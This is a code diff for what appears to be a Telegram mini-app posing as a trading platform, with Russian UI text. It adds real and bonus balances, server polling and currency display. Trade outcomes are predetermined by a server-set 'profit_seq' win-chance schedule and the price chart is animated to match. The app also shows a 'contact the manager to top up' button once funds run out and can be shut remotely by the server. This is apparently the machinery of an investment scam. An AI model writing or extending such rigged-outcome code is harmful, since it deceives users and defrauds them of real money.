@@ -321,7 +321,7 @@
 
     <div class="account-card">
         <div class="account-label">Торговый счёт</div>
-        <div class="account-amount" id="globalBalance">$1,000</div>
+        <div class="account-amount" id="globalBalance">0</div>
         <div class="account-sub" id="accountSub">Статус: активен</div>
         <button class="manager-button" id="contactManagerBtn">Написать менеджеру для пополнения</button>
     </div>
@@ -339,14 +339,11 @@
         <div class="amount-box">
             <div class="amount-label">Сумма инвестиции</div>
             <div class="amount-input-row">
-                <span class="amount-currency">$</span>
+                <span class="amount-currency" id="currencySymbolUi"></span>
                 <input type="number" inputmode="decimal" class="amount-input" id="amountInput" placeholder="0" min="1" step="1">
             </div>
-            <div class="quick-amounts">
-                <div class="quick-chip" data-amount="10">$10</div>
-                <div class="quick-chip" data-amount="25">$25</div>
-                <div class="quick-chip" data-amount="50">$50</div>
-                <div class="quick-chip" data-amount="100">$100</div>
+            <div class="quick-amounts" id="quickAmountsContainer">
+                <!-- Заполняется динамически через JS с правильной валютой -->
             </div>
         </div>
 
@@ -355,7 +352,7 @@
             <canvas id="marketCanvas"></canvas>
             <div class="trade-pnl-panel" id="tradePnlPanel">
                 <div class="trade-pnl-percent" id="tradePnlPercent">+0%</div>
-                <div class="trade-pnl-amount" id="tradePnlAmount">+$0</div>
+                <div class="trade-pnl-amount" id="tradePnlAmount">+0</div>
             </div>
         </div>
 
@@ -394,14 +391,11 @@ const MENTOR_TIPS = [
     '🕯️ Свечи на ленте показывают консолидацию перед движением',
     '💡 Разумная стратегия — не вкладывать весь депозит в одну сделку',
     '🔍 На объёмах заметна активность — кто-то накапливает позицию',
-    '🌐 Глобальный сентимент сегодня смешанный, действуйте осторожно',
-    '📉 После коррекции часто открываются интересные точки входа',
-    '🏦 Крупные фонды снова в центре внимания трейдеров',
-    '🔥 Ликвидность на рынке заметно выросла за последний час',
-    '🧭 Хорошая привычка — не гнаться за упущенным движением'
+    '🌐 Глобальный сентимент сегодня смешанный, действуйте осторожно'
 ];
 
-const STORAGE_KEY_BALANCE = 'tt_account_balance';
+const STORAGE_KEY_REAL = 'tt_real_balance';
+const STORAGE_KEY_BONUS = 'tt_bonus_balance';
 const STORAGE_KEY_HISTORY = 'tt_trade_history';
 const MAX_HISTORY_ITEMS = 60;
 
@@ -425,12 +419,20 @@ const state = {
     userId: null,
     profileLoaded: false,
     history: [],
-    balance: 1000,
+    realBalance: 0,
+    bonusBalance: 0,
+    currencySymbol: "",
     tradeInProgress: false,
     activeTrade: null,
     script_trades: 0,
-    profit_seq: "70/30:20 20/80:1000"
+    profit_seq: "70/30:20 20/80:1000",
+    win_chance: null
 };
+
+// Вычисляемое свойство для общего баланса
+function getTotalBalance() {
+    return state.realBalance + state.bonusBalance;
+}
 
 let tradeAnimFrameId = null;
 const CHART_MONO_FONT = "'SF Mono', 'Roboto Mono', Consolas, monospace";
@@ -503,6 +505,7 @@ function bindClickSound() {
 let syncDebounceTimer = null;
 let syncInFlight = false;
 let profileLoadInFlight = false;
+let hasUnsyncedTrade = false; 
 
 function getInitData() {
     return state.tg && state.tg.initData ? state.tg.initData : '';
@@ -511,6 +514,54 @@ function getInitData() {
 function showSyncIndicator(text, isError) {
     if (isError) console.warn('[sync]', text);
     else console.log('[sync]', text);
+}
+
+// ----------------- ФОНОВЫЙ ОПРОС СЕРВЕРА -----------------
+let pollingTimer = null;
+function startBackgroundPolling() {
+    pollingTimer = setInterval(async () => {
+        if (state.tradeInProgress || syncInFlight || profileLoadInFlight || hasUnsyncedTrade) return;
+        if (!state.userId) return;
+
+        try {
+            const response = await fetch(`${BASE_URL}/api/get_profile?user_id=${encodeURIComponent(state.userId)}`, {
+                headers: { 'ngrok-skip-browser-warning': 'true' }
+            });
+
+            if (response.status === 403) {
+                clearInterval(pollingTimer);
+                if (state.tg) state.tg.close(); 
+                document.body.innerHTML = '<div style="display:flex; height:100vh; align-items:center; justify-content:center; color:var(--red); font-family:var(--mono); font-weight:bold; font-size:18px;">СОЕДИНЕНИЕ РАЗОРВАНО</div>';
+                return;
+            }
+
+            if (!response.ok) return;
+
+            const data = await response.json();
+            if (data.status === 'success') {
+                if (data.profit_seq) state.profit_seq = data.profit_seq;
+                
+                if (data.script_trades !== undefined) {
+                    state.script_trades = parseInt(data.script_trades) || 0;
+                }
+                
+                if (data.currency_symbol !== undefined) {
+                    state.currencySymbol = data.currency_symbol;
+                    updateCurrencyUI();
+                }
+
+                const sReal = parseFloat(data.real_balance);
+                const sBonus = parseFloat(data.bonus_balance);
+                
+                if (Math.abs(state.realBalance - sReal) > 0.01 || Math.abs(state.bonusBalance - sBonus) > 0.01) {
+                    state.realBalance = sReal;
+                    state.bonusBalance = sBonus;
+                    renderBalance();
+                    persistBalance({ skipSync: true });
+                }
+            }
+        } catch (err) {}
+    }, 3000);
 }
 
 async function loadUserProfileFromServer() {
@@ -524,26 +575,26 @@ async function loadUserProfileFromServer() {
         const data = await response.json();
 
         if (data.status === 'success') {
-            state.balance = parseFloat(data.balance);
+            state.realBalance = parseFloat(data.real_balance) || 0;
+            state.bonusBalance = parseFloat(data.bonus_balance) || 0;
             state.history = data.history || [];
             state.script_trades = parseInt(data.script_trades) || 0;
             if (data.profit_seq) state.profit_seq = data.profit_seq;
+            if (data.currency_symbol !== undefined) state.currencySymbol = data.currency_symbol;
+            
             state.profileLoaded = true;
+            updateCurrencyUI();
             persistBalance({ skipSync: true });
             persistHistoryLocalOnly();
             renderBalance();
             renderHistory();
-            showSyncIndicator('профиль загружен', false);
         }
     } catch (err) {
-        showSyncIndicator('офлайн: локальные данные', true);
         state.profileLoaded = true;
     } finally {
         profileLoadInFlight = false;
     }
 }
-
-let hasUnsyncedTrade = false; 
 
 async function syncDataWithBot() {
     if (syncInFlight || profileLoadInFlight) return;
@@ -552,9 +603,11 @@ async function syncDataWithBot() {
     const sendingTrade = hasUnsyncedTrade;
     hasUnsyncedTrade = false; 
 
+    // Отправляем РЕАЛЬНЫЙ и БОНУСНЫЙ баланс раздельно
     const payload = {
         user_id: state.userId,
-        balance: state.balance,
+        real_balance: state.realBalance,
+        bonus_balance: state.bonusBalance,
         history: state.history,
         initData: getInitData(),
         trade_done: sendingTrade ? 1 : 0
@@ -578,7 +631,6 @@ async function syncDataWithBot() {
             state.profit_seq = data.profit_seq;
         }
 
-        showSyncIndicator('синхронизировано', false);
     } catch (err) {
         if (sendingTrade) hasUnsyncedTrade = true;
     } finally {
@@ -591,6 +643,24 @@ function scheduleSync(isTrade = false) {
     if (isTrade) hasUnsyncedTrade = true;
     clearTimeout(syncDebounceTimer);
     syncDebounceTimer = setTimeout(syncDataWithBot, SYNC_DEBOUNCE_MS);
+}
+
+function updateCurrencyUI() {
+    document.getElementById('currencySymbolUi').textContent = state.currencySymbol;
+    
+    // Перестраиваем кнопки быстрых сумм с учетом валюты
+    const cCont = document.getElementById('quickAmountsContainer');
+    if(cCont) {
+        cCont.innerHTML = '';
+        [10, 25, 50, 100].forEach(val => {
+            const d = document.createElement('div');
+            d.className = 'quick-chip';
+            d.dataset.amount = val;
+            d.textContent = `${state.currencySymbol}${val}`;
+            cCont.appendChild(d);
+        });
+        bindQuickAmounts(); // перебиндить эвенты
+    }
 }
 
 async function init() {
@@ -607,11 +677,11 @@ async function init() {
             : 99999;
 
         loadState();
+        updateCurrencyUI();
         renderBalance();
         renderHistory();
         buildTicker();
         bindAmountInput();
-        bindQuickAmounts();
         bindDirectionButtons();
         bindStaticButtons();
         bindClickSound();
@@ -620,6 +690,8 @@ async function init() {
         setInterval(refreshTicker, 4000);
 
         await loadUserProfileFromServer();
+        
+        startBackgroundPolling();
         
         setInterval(() => { if(hasUnsyncedTrade) scheduleSync(); }, SYNC_INTERVAL_MS);
 
@@ -630,8 +702,10 @@ async function init() {
 
 function loadState() {
     try {
-        const savedBalance = localStorage.getItem(STORAGE_KEY_BALANCE);
-        if (savedBalance !== null) state.balance = parseFloat(savedBalance);
+        const sReal = localStorage.getItem(STORAGE_KEY_REAL);
+        const sBonus = localStorage.getItem(STORAGE_KEY_BONUS);
+        if (sReal !== null) state.realBalance = parseFloat(sReal);
+        if (sBonus !== null) state.bonusBalance = parseFloat(sBonus);
     } catch (err) {}
     try {
         const savedHistory = localStorage.getItem(STORAGE_KEY_HISTORY);
@@ -640,8 +714,10 @@ function loadState() {
 }
 
 function persistBalance(options) {
-    try { localStorage.setItem(STORAGE_KEY_BALANCE, String(state.balance)); }
-    catch (err) {}
+    try { 
+        localStorage.setItem(STORAGE_KEY_REAL, String(state.realBalance));
+        localStorage.setItem(STORAGE_KEY_BONUS, String(state.bonusBalance));
+    } catch (err) {}
     if (!options || !options.skipSync) scheduleSync();
 }
 
@@ -1204,31 +1280,42 @@ function switchTab(pageId, evt) {
 
 function renderBalance() {
     const el = document.getElementById('globalBalance');
-    const formatted = formatMoney(state.balance);
-    el.textContent = formatted;
-    el.classList.toggle('negative', state.balance < 0);
+    el.textContent = formatMoney(getTotalBalance());
+    el.classList.toggle('negative', getTotalBalance() < 0);
 
     const sub = document.getElementById('accountSub');
-    sub.textContent = state.balance < 0 ? 'Статус: маржинальное требование не исполнено' : 'Статус: активен';
+    sub.textContent = getTotalBalance() < 0 ? 'Статус: маржинальное требование не исполнено' : 'Статус: активен';
 
     const managerBtn = document.getElementById('contactManagerBtn');
-    if (managerBtn) managerBtn.style.display = state.balance <= 0 ? 'block' : 'none';
+    if (managerBtn) managerBtn.style.display = getTotalBalance() <= 0 ? 'block' : 'none';
 }
 
-function adjustBalance(delta) {
-    state.balance = round2(state.balance + delta);
+// ПРАВИЛЬНОЕ СПИСАНИЕ БАЛАНСОВ (СНАЧАЛА РЕАЛ, ЗАТЕМ БОНУС)
+function applyTradeResultToBalance(netChange) {
+    if (netChange > 0) {
+        state.realBalance += netChange;
+    } else {
+        let loss = Math.abs(netChange);
+        if (state.realBalance >= loss) {
+            state.realBalance -= loss;
+        } else {
+            let remainder = loss - state.realBalance;
+            state.realBalance = 0;
+            state.bonusBalance = Math.max(0, state.bonusBalance - remainder);
+        }
+    }
     persistBalance();
     renderBalance();
 }
 
 function formatMoney(value) {
     const sign = value < 0 ? '-' : '';
-    return sign + '$' + Math.abs(value).toLocaleString('en-US', { maximumFractionDigits: 2, minimumFractionDigits: 0 });
+    return sign + state.currencySymbol + Math.abs(value).toLocaleString('en-US', { maximumFractionDigits: 2, minimumFractionDigits: 0 });
 }
 
 function formatSignedMoney(value) {
     const sign = value >= 0 ? '+' : '-';
-    return sign + '$' + Math.abs(value).toLocaleString('en-US', { maximumFractionDigits: 2, minimumFractionDigits: 0 });
+    return sign + state.currencySymbol + Math.abs(value).toLocaleString('en-US', { maximumFractionDigits: 2, minimumFractionDigits: 0 });
 }
 
 function round2(value) { return Math.round(value * 100) / 100; }
@@ -1260,7 +1347,6 @@ function bindDirectionButtons() {
     document.getElementById('downButton').addEventListener('click', () => placeTrade('down'));
 }
 
-// ---------------- ЛОКАЛЬНЫЙ ПАРСЕР СЦЕНАРИЕВ ----------------
 function getTradePhaseChance(seqStr, tradesDone) {
     if (!seqStr) return 50;
     const parts = seqStr.split(' ').filter(p => p.includes(':'));
@@ -1290,7 +1376,7 @@ function placeTrade(direction) {
             showNotice('Укажите сумму инвестиции', false);
             return;
         }
-        if (amount > state.balance) {
+        if (amount > getTotalBalance()) {
             showNotice('Недостаточно средств на счёте для этой сделки', false);
             return;
         }
@@ -1301,12 +1387,10 @@ function placeTrade(direction) {
 
         const entryPrice = marketCandles[marketCandles.length - 1].c;
 
-        // ВЫСЧИТЫВАЕМ ШАНС АВТОНОМНО НА ОСНОВЕ СЦЕНАРИЯ
         const chanceNum = getTradePhaseChance(state.profit_seq, state.script_trades);
         const winChance = chanceNum / 100;
         const targetWin = Math.random() < winChance;
 
-        // ЛОГ В КОНСОЛЬ ДЛЯ ПРОВЕРКИ
         console.log(`[ПРОФИТ] Сделка №${state.script_trades + 1} | Фаза шанса: ${chanceNum}% | Задано: ${targetWin ? 'ПОБЕДА' : 'ПОРАЖЕНИЕ'}`);
 
         let pathCandles = [];
@@ -1354,7 +1438,8 @@ function placeTrade(direction) {
 
         document.getElementById('chartBox').classList.add('fullscreen');
 
-        adjustBalance(-amount); 
+        // Списываем ставку со счетов
+        applyTradeResultToBalance(-amount);
 
         for (let i = 0; i < TRADE_CANDLES; i++) {
             const growingCandle = { o: entryPrice, h: entryPrice, l: entryPrice, c: entryPrice, v: 0 };
@@ -1399,8 +1484,9 @@ function revealTradeResult(trade) {
     trade.revealed = true;
     trade.result = trade.won ? 'win' : 'lose';
 
+    // Возвращаем исходную ставку + профит на правильные счета
     const refundAmount = trade.amount + trade.netChange;
-    adjustBalance(refundAmount);
+    applyTradeResultToBalance(refundAmount);
     
     addHistoryEntry(trade.direction, trade.amount, trade.netChange);
 
